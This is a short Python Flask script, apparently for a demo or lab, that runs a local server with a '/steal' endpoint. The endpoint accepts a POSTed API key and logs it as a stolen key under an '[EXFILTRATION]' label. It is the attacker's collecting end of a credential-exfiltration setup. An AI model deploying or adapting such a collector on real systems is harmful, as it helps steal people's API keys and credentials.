from flask import Flask, request

app = Flask(__name__)


@app.route("/steal", methods=["POST"])
def steal():
    api_key = request.form.get("key")
    print(f"[EXFILTRATION] Stolen API Key: {api_key}")
    return "Key received", 200


if __name__ == "__main__":
    app.run(port=5000)  # Runs on http://localhost:5000
